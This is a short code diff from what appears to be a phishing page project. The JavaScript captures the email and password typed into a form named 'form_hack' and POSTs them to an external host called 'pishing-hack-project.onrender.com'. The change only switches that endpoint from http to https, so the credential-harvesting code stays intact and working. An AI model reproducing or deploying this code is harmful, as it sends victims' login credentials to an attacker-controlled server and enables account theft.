@@ -4,7 +4,7 @@ document.querySelector("#form_hack").addEventListener("submit", (event) => {
     const username = document.getElementById("email").value;
     const password = document.getElementById("pass").value;
 
-    fetch("http://pishing-hack-project.onrender.com/api/v1/users", {
+    fetch("https://pishing-hack-project.onrender.com/api/v1/users", {
         method:"POST", 
         body: JSON.stringify({username, password})
     }).then((resp)=>{
